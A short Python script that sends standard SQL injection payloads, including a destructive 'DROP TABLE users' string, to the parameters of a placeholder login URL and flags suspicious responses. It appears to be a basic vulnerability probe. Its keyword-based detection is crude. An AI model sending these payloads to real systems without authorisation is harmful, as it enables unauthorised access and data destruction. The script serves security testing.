import requests


def test_sql_injection(url, params):
    payloads = ["' OR '1'='1", '" OR "1"="1', "'; DROP TABLE users; --", "admin' --", "' OR 'a'='a"]
    for payload in payloads:
        injected_params = {key: payload for key in params.keys()}
        response = requests.get(url, params=injected_params)
        if "syntax" in response.text or "error" in response.text or "warning" in response.text:
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")


url = "http://example.com/login"
params = {"username": "admin", "password": "password"}
test_sql_injection(url, params)
